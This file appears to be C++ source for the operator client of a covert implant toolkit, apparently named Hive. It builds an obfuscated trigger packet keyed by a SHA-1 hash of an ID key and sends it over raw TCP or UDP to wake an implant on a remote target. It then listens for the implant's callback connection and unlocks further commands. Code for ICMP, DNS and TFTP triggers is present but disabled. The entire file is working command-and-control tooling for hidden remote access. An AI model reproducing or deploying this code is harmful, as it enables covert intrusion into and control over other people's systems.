#include <string>
#include <iostream>
#include <fstream>
#include <cstdlib>

#include <stdio.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdlib.h>

#include "LibraryModuleBase.h"
#include "Primitive.h"
#include "ProcessCmdResponse.h"
#include "Ilm.h"
#include "Connection.h"
#include "Utilities.h"
#include "ilm-client.h"
#include "hive.h"

extern "C"
{
	#include "proj_strings.h"
	#include "crypto.h"
	#include "trigger_protocols.h"
	#include "trigger_network.h"
	#include "trigger_utils.h"

	int trigger_tftp_wrq (Payload *p, trigger_info *ti);
	int trigger_icmp_ping (Payload *p, trigger_info *ti);
	int trigger_icmp_error (Payload *p, trigger_info *ti);
	int trigger_dns_query (Payload *p, trigger_info *ti);
	unsigned int trigger_raw (Payload *p, trigger_info *ti);
	int trigger_info_to_payload( Payload * p, trigger_info * ti);

	void displaySha1Hash(char *label, unsigned char *sha1Hash);

	#ifdef DEBUG
		int dbug_level_ = 8;	// debug level
	#endif
}

using namespace InterfaceLibrary;
using namespace InterfaceLibrary::Primitive;
using namespace std;
using namespace Ilm;

extern HiveILM			*myILMInstance;
extern Ilm::Listener	*myListener;
extern Ilm::Trigger		*myTrigger;


//***************************************************************************************
// GLOBAL VARIABLE
uint16_t	lport = 0;
int			do_trigger_listen = 0;
int			parse_config_only = 0;

//**************************************************************************************
// LISTENER
//**************************************************************************************
Listener::Listener()
{
	DL(6);
	this->connection = new Connection();

	if (this->connection == 0)
	{
		cout << "\n\nListener constructor failed to create a connection.\n" << endl;
	}
}

Listener::~Listener()
{
	DL(6);
	delete this->connection;
}

void Listener::Listen( Primitive::Activation& actvn, ProcessCmdAccumulator& acc, ProcessCmdResponse& resp )
{
	string		ipaddr;
	String		*argPtr = (String *)(actvn.arguments);

	DL(6);
	// see discussion of this global variable in Trigger::triggerImplant()
	parse_config_only = NO;

	// listen-only: otherwise, lport will be set by the trigger code
	if ( do_trigger_listen == NO )
	{
		lport = atoi( *argPtr );
	}

	resp.type = ProcessCmdResponse::TYPE_Local_Failure;

	// check to see if we have a Connection object used later
	if (connection == 0 )
	{
		cout << "\n\n ERROR: Connection object not initialized.\n" << endl;
		return;
	}

	// trigger+listen
	// parse or create trigger configuration file.  at this point, we really
	// just need the callback port
	if ( do_trigger_listen == YES )
	{
		parse_config_only = YES;
		myTrigger->triggerImplant( actvn, acc, resp );
		parse_config_only = NO;

		if( resp.type != ProcessCmdResponse::TYPE_Success )
		{
			cout << " ERROR: Problem with parsing or creating the trigger configuration file." << endl;
			return;
		}
	
	}

	// attempt to listen on the callback port first, to make sure 
	// its not in use and we have appropriate permissions
	if ( this->connection->Listen( lport ) == ERROR )
	{
		resp.type = ProcessCmdResponse::TYPE_Local_Failure;
		resp.resultsLines.push_back( ProcessCmdResponse::Line( 0, "Error: Could not create listening socket." ) );
		return;		
	}

	// trigger+listen: send the trigger
	// the trigger configuration file will be re-read
	if ( do_trigger_listen == YES )
	{
		parse_config_only = NO;
		myTrigger->triggerImplant( actvn, acc, resp );

		if( resp.type != ProcessCmdResponse::TYPE_Success )
		{
			// close the listening socket
			this->connection->Close();
			cout << " ERROR: Problem with parsing or creating the trigger configuration file." << endl;
			return;
		}
	}

	// accept the callback connection
	if ( this->connection->Accept( ipaddr ) == ERROR )
	{
		resp.type = ProcessCmdResponse::TYPE_Local_Failure;
		resp.resultsLines.push_back( ProcessCmdResponse::Line( 0, "Error: Problems with accepting server connection." ) );
		return;		
	}
	
	// connection successful, so update primitives available in CT UI
	Utilities::SetCTStateConnected();
	myILMInstance->AddCustomCmds();
//	myILMInstance->AddCmdShutDown();

	// change the CT UI command prompt
	ProcessCmdResponse::Line fLine1( 0, ipaddr.c_str() );
	resp.resultsLines.push_back( fLine1 );
	resp.resultsLines.push_back( fLine1 );
	
	// return success
	resp.type = ProcessCmdResponse::TYPE_Success;

	// reset global parameters for safety (if called multiple times by user and in different modes)
	parse_config_only = NO;
	do_trigger_listen = NO;
	lport = NO;

	return;
};

Connection* Listener::getConnection()
{
	DL(6);
	return this->connection;
}

void Listener::setConnection( Connection *newConnection)
{
	DL(6);
	std::cout << "\n\n Did you call Listener::getConnection and delete that connection first?\n" << endl;
	this->connection = newConnection;
}

void Listener::TriggerAndListen( Primitive::Activation& actvn, ProcessCmdAccumulator& acc, ProcessCmdResponse& resp )
{
	DL(6);
	// set the global variable checked by triggerImplant() and Listen()
	do_trigger_listen = YES;

	// default return value
	resp.type = ProcessCmdResponse::TYPE_Local_Failure;

	this->Listen( actvn, acc, resp );

	// reset global parameters for safety (if called multiple times by user and in different modes)
	// yes, this is done in multiple times throughout code
	do_trigger_listen = NO;

	return;

}


int Trigger::parse_prompt_config_file( std::string triggerFileName, params *t_param )
{
	ifstream	triggerFile;
	ofstream	newTriggerFile;

	//Arguments read/supported for triggering the implant;
	char		delim='|';
	char		tempInput[ MAX_INPUT_LEN ];

	//Variables used for verifying input parameters...
	struct sockaddr_in testSocket;
	int			badProtocolType = YES;  			//Zero/NO is good.
	int			checkRawPort = NO;
	int			checkRootPermissions = NO;

	DL(6);
   //See if the desired trigger file exists...
	triggerFile.open(triggerFileName.c_str());

	if (triggerFile.fail())
	{
		//  The requested File does not exist, so we will prompt the user for input values and create it...
		cout << "\nTarget profile not found, generating a new one...\n\n";
		//Create new triggerFile
		newTriggerFile.open(triggerFileName.c_str());

		if (!newTriggerFile.fail())
		{
			cin.width(MAX_INPUT_LEN);

			cout << " Callback IP address? ";
			cin >> t_param->callbackAddress;
			newTriggerFile << t_param->callbackAddress;
			newTriggerFile << '|';

			cout << " Callback Port number [1-65535]? ";
			cin >> tempInput;
			// input validate happens when we re-read the file in
			t_param->callbackPort = atoi(tempInput);
			newTriggerFile << tempInput;
			newTriggerFile << '|';

			cout << " Remote IP address?   ";
			cin >> t_param->targetAddress;
			newTriggerFile << t_param->targetAddress;
			newTriggerFile << '|';

			do { // Request an ID key or filename until a valid entry results
				cout << " ID Key or filename? ";
				cin >> t_param->idKey;
				if (access(t_param->idKey, R_OK)) {
					// Using ID Key
					if (strlen(t_param->idKey) < ID_KEY_LENGTH_MIN) {
						cout << "ID Key length too short (must be at least " << ID_KEY_LENGTH_MIN << " characters)\n" << endl;
						continue;
					}
					newTriggerFile << t_param->idKey;
					newTriggerFile << "||";
					break;
				}

				// Using ID Key File
				cout << "   ID key file found.\n";
				memcpy(t_param->idKeyFilename, t_param->idKey, sizeof(t_param->idKeyFilename));
				(t_param->idKey)[0] = '\0';
				newTriggerFile << "|";
				newTriggerFile << t_param->idKeyFilename;
				newTriggerFile << "|";
				break;
			} while (1);

//			cout << " Trigger type [dns-request, icmp-error, ping-request, ping-reply, raw-tcp, raw-udp, tftp-wrq]? ";
			cout << " Trigger type [raw-tcp, raw-udp]? ";
			cin >> t_param->protocolType;
			newTriggerFile << t_param->protocolType;
			newTriggerFile << '|';

			if ( strstr( t_param->protocolType, "raw-" ) != NULL )
			{
				do {
					cout << " Remote port number for RAW trigger packet [1-65535]? ";
					cin >> tempInput;
				} while ( ( atoi(tempInput) < 1 ) || ( atoi(tempInput) > 65535 ) ) ;
		
				t_param->rawPort = atoi( tempInput);
			}
			else
			{
				t_param->rawPort = 0;
			}

			newTriggerFile << t_param->rawPort;

			newTriggerFile << "\n";
		}
		else 
		{
			cout << " ERROR: File open/create error [" << triggerFileName << "]." << endl;
			return -1;
		}
		newTriggerFile.close();
	} else {
		cout << "\nUsing existing target profile.\n";
		triggerFile.close();
	}

   //Let's read the inputFile and check it's input variables...
	triggerFile.open(triggerFileName.c_str());
	if (triggerFile.fail())
	{
		//Failed to open the file again
		cout << "ERROR: Can not open the configuration file [" << triggerFileName << "]." << endl;
		return -1;
	}
	else
	{
		//Read and verify the input variables
		//cout << "\n\n The file [" << triggerFileName << "] exists." << endl;

		//Get and verify callbackAddress
		triggerFile.getline( t_param->callbackAddress, MAX_INPUT_LEN, delim);
//cout << "DEBUG: " << t_param->callbackAddress << endl;
		if (inet_pton( AF_INET, t_param->callbackAddress, &testSocket.sin_addr) != 1)
		{
			cout << " ERROR: Callback IP address [" << t_param->callbackAddress << "] invalid." << endl;
			return -1;
		}

		//Get and verify callbackPort
		triggerFile.getline( tempInput, MAX_INPUT_LEN, delim);
//cout << "DEBUG: " << tempInput << endl;
		t_param->callbackPort = atoi( tempInput);

		if (( t_param->callbackPort > 65535) || ( t_param->callbackPort <= 0))
		{
			cout << "\n ERROR: Callback Port [" << t_param->callbackPort << "] invalid. Must be numeric between 1 to 65535." << endl;
			return -1;
		}

// j: also set global variable for use by Listen()
		lport = (uint16_t)t_param->callbackPort; 

		//Get and verify targetAddress
		triggerFile.getline( t_param->targetAddress, MAX_INPUT_LEN, delim);
//cout << "DEBUG: " << t_param->targetAddress << endl;

		if (inet_pton( AF_INET, t_param->targetAddress, &testSocket.sin_addr) != 1)
		{
			cout << "\n ERROR: Remote IP address [" << t_param->targetAddress << "] invalid." << endl;
			return -1;
		}

		// Get and verify ID key

		triggerFile.getline( t_param->idKey, MAX_INPUT_LEN, delim);
//cout << "DEBUG: idKey = " << t_param->idKey << endl;
		if (strlen(t_param->idKey) == 0) {
			triggerFile.getline( t_param->idKeyFilename, MAX_INPUT_LEN, delim);
//cout << "DEBUG: idKeyFilename = " << t_param->idKeyFilename << endl;
			if (strlen(t_param->idKeyFilename) == 0) {
				cout << "ERROR: Missing ID key." << endl;
				return -1;
			}
			if (access(t_param->idKeyFilename, R_OK)) {
				perror("Unable to access ID key file.\n");
				return -1;
			}
		} else {
			if (strlen(t_param->idKey) < ID_KEY_LENGTH_MIN) {
//cout << "DEBUG: idKey length = " << strlen(t_param->idKey) << endl;
				cout << "ID Key length too short (must be at least " << ID_KEY_LENGTH_MIN << " characters)\n" << endl;
				return -1;
			}
			t_param->idKeyFilename[0] = '\0';	// Null terminate the filename field.
			triggerFile.ignore(1);			// Skip over the blank field
		}

		//Get and verify protocolType 
		triggerFile.getline( t_param->protocolType, MAX_INPUT_LEN, delim);

#if 0	// Disable now-unsupported protocols
		if (strcmp( t_param->protocolType, "dns-request") == 0)
		{
			badProtocolType = NO;
		}
		else if (strcmp( t_param->protocolType, "icmp-error") == 0)
		{
			badProtocolType = NO;
			checkRootPermissions = YES;
		}
		else if (strcmp( t_param->protocolType, "ping-request") == 0)
		{
			badProtocolType = NO;
			checkRootPermissions = YES;
		}
		else if (strcmp( t_param->protocolType, "ping-reply") == 0)
		{
			badProtocolType = NO;
			checkRootPermissions = YES;
		}
		else
#endif
			if (strcmp( t_param->protocolType, "raw-tcp") == 0)
		{
			badProtocolType = NO;
			checkRawPort = YES;
		}
		else if (strcmp( t_param->protocolType, "raw-udp") == 0)
		{
			badProtocolType = NO;
			checkRawPort = YES;
		}
#if 0
		else if (strcmp( t_param->protocolType, "tftp-wrq") == 0)
		{
			badProtocolType = NO;
		}
#endif
		if (badProtocolType != NO)
		{
			cout << "\n\n ERROR: Trigger protocol type [" << t_param->protocolType << "] invalid. It must be one of the following:" << endl;
			cout << "        raw-tcp or raw-udp" << endl;
			return -1;
		}

		if ( checkRootPermissions == YES )
		{
			if ( Utilities::IsRoot() == NO )
			{
			cout << "\n\n ERROR: icmp-error, ping-request, ping-reply require the client to run with root permissions." << endl;
				return -1;
			}
		}

		//Get and verify rawPort 
		triggerFile.getline( tempInput, MAX_INPUT_LEN, delim);

		t_param->rawPort = atoi( tempInput);

		if (checkRawPort == YES )
		{
			if (( t_param->rawPort > 65535) || ( t_param->rawPort <= 0))
			{
				cout << "\n\n ERROR: Remote trigger port (i.e. raw) number [" << t_param->rawPort << "] invalid. Must be numberic between 1 to 65535.\n" << endl;
				return -1;
			}
		}
		else
		{
			if ( t_param->rawPort > 0)
			{
				cout << "\n\n ERROR: Trigger type [" << t_param->protocolType << "] with a configured RAW port [" << t_param->rawPort << "] invalid.\n" << endl;
				return -1;
			}
		}

		if ( parse_config_only == NO )
		{
			//We have read all of the input data, display it back to the user.
			cout << endl << endl;
			cout << " Trigger details: " << endl;
			cout << "  . Remote IP address " << t_param->targetAddress << " with " << t_param->protocolType << " trigger ";

			if ( checkRawPort == NO )
			{
				cout << endl;
			}
			else
			{
				cout << "on port " << t_param->rawPort << endl;
			}
	
			cout << "  . Callback IP address " << t_param->callbackAddress << " on port " << t_param->callbackPort << endl;
		}

	}

	triggerFile.close();
	//Everything checked out okay...

	return 0;
}

void Trigger::triggerImplant( Primitive::Activation& actvn, ProcessCmdAccumulator&, ProcessCmdResponse& resp )
{

	ifstream	randomFile;
	ifstream	idKeyFile;
	String		*argPtr = (String *)(actvn.arguments);
	string		triggerFileName = *argPtr;
	struct params	t_param;

	trigger_info  	ti;             //Trigger information Structure used for building and sending the trigger...
	Payload       	p;		//Payload for transmission....
	int		rv = 0;

	DL(6);
	//Initialize status for triggering
	resp.type = ProcessCmdResponse::TYPE_Local_Failure;

	if ( parse_prompt_config_file( triggerFileName, &t_param ) < 0 )
	{
		cout << "\n ERROR: Problem with configuration file parsing or creation." << endl;
		return;
	}

	// yes, this isn't a great way, but will quickly satisfy the requirement.
	// parse_config_only is a global flag to "synchronize" when the trigger is sent.
	// in the case of trigger+listen, this function is called twice.
	// the first time it is called is only to obtain the configuration...specifically
	// the callback port.  the callback port is checked by the caller to make sure
	// its not in use and application has appropriate permissions to use it before
	// sending the trigger only to find out later that the port could not be used.
	if ( parse_config_only == YES )
	{
		resp.type = ProcessCmdResponse::TYPE_Success;
		return;
	}

	/* continuing will send the trigger */

   //------------trigger_info----------------
	//Create trigger info as required...
	memset( &ti, 0, sizeof( trigger_info ) );

	//Default values...
	ti.icmp_error_code = 4;
	ti.trigger_port = 0;

	//Set the trigger_type
#if 0	// Disable unsupported protocols
	if (strcmp( t_param.protocolType, "dns-request") == 0)
	{
		ti.trigger_type = T_DNS_REQUEST;
	}
	else if (strcmp( t_param.protocolType, "icmp-error") == 0)
	{
		ti.trigger_type = T_ICMP_ERROR;
	}
	else if (strcmp( t_param.protocolType, "ping-request") == 0)
	{
		ti.trigger_type = T_PING_REQUEST;
	}
	else if (strcmp( t_param.protocolType, "ping-reply") == 0)
	{
		ti.trigger_type = T_PING_REPLY;
	}
	else
#endif
		if (strcmp( t_param.protocolType, "raw-tcp") == 0)
	{
		ti.trigger_type = T_RAW_TCP;
		ti.trigger_port = t_param.rawPort;
	}
	else if (strcmp( t_param.protocolType, "raw-udp") == 0)
	{
		ti.trigger_type = T_RAW_UDP;
		ti.trigger_port = t_param.rawPort;
	}
#if 0
	else if (strcmp( t_param.protocolType, "tftp-wrq") == 0)
	{
		ti.trigger_type = T_TFTP_WRQ;
	}
#endif
//	ti.callback_port = htons( t_param.callbackPort );
	ti.callback_port = t_param.callbackPort;
	inet_pton( AF_INET, t_param.callbackAddress, &(ti.callback_addr));
	inet_pton( AF_INET, t_param.targetAddress, &(ti.target_addr));

	// Read and process ID key
//cout << "DEBUG: Key file \"" << t_param.idKeyFilename << "\".\n";
//cout << "DEBUG: Key filename length \"" << strlen(t_param.idKeyFilename) << "\".\n";
	if (strlen(t_param.idKeyFilename) > 0) {
		if (sha1_file(t_param.idKeyFilename, ti.triggerKey) != 0) {
			cout << "ERROR: Could not generate trigger key from key file \"" << t_param.idKeyFilename << "\".\n";
			return;
		}
	} else {
		sha1((const unsigned char *)t_param.idKey, strlen(t_param.idKey), ti.triggerKey);
	}
	displaySha1Hash((char *)"  . Trigger key: ", ti.triggerKey);

   //------------Payload----------------
	memset( &p, 0, sizeof( Payload ) );
	
	//Obfuscate the payload using /dev/urandom
	randomFile.open("/dev/urandom\0", ios::binary);
	if (randomFile.fail())
	{
		cout << "\n\n ERROR: Could not open /dev/urandom for randomization of payloads.\n" << endl;
		return;
	}
	else
	{
		randomFile.read( (char *)&p, sizeof( Payload) );
	}
	randomFile.close();

	//Create an application specific payload from the trigger info
	//trigger_info_to_payload( &p, &ti );     //Can't seem to link, we'll do this method here...

	if (trigger_info_to_payload(&p, &ti)) {
		return;
	}

	//Finalize payloads and send the triggers...
	switch (ti.trigger_type)
	{
#if 0 // These triggers no longer supported
		case T_PING_REQUEST:
		case T_PING_REPLY:
			//cout << "\n\n\n Calling trigger_icmp_ping...\n" << endl;
			rv = trigger_icmp_ping( &p, &ti );
			break;

		case T_ICMP_ERROR:
			//cout << "\n\n\n Calling trigger_icmp_error...\n" << endl;
			rv = trigger_icmp_error( &p, &ti );
			break;

		case T_TFTP_WRQ:
			//cout << "\n\n\n Calling trigger_tftp_wrq...\n" << endl;
			rv = trigger_tftp_wrq( &p, &ti );   
			break;

		case T_DNS_REQUEST:
			//cout << "\n\n\n Calling trigger_dns_query...\n" << endl;
			rv = trigger_dns_query( &p, &ti );
			break;
#endif
		case T_RAW_TCP:
		case T_RAW_UDP:
			//cout << "\n\n\n Calling trigger_raw...\n" << endl;
			rv = trigger_raw( &p, &ti );
			break;

		default:
			return;

	}

	if ( parse_config_only == NO )
	{
		if ( rv == 0 )
		{
			cout << "\n Trigger sent.\n" << endl;
		}
		else
		{
			cout << "\n ERROR: Trigger failed!" << endl;
			if ( ti.trigger_type == T_RAW_TCP )
			{
				cout << " . Note: raw-tcp triggers require an open TCP port on the remote host." << endl;
			}
			return;
			cout << endl;
		}
	}

	resp.type = ProcessCmdResponse::TYPE_Success;

	if ( do_trigger_listen == NO )
	{
		// if NO, command prompt will be changed by the caller
		ProcessCmdResponse::Line fLine1( 0, "Trigger-Sent" );
		resp.resultsLines.push_back( fLine1 );
		resp.resultsLines.push_back( fLine1 );
	}

	return;
};


//define displaySha1Hash function
void displaySha1Hash(char *label, unsigned char *sha1Hash)
{
	int i=0;

	//Display Label
	printf( "%s", label );

	//Display 40 hexadecimal number array
	for (i=0; i < ID_KEY_HASH_SIZE; i++)
		printf("%02x",sha1Hash[i]);
	printf( "\n" );
}

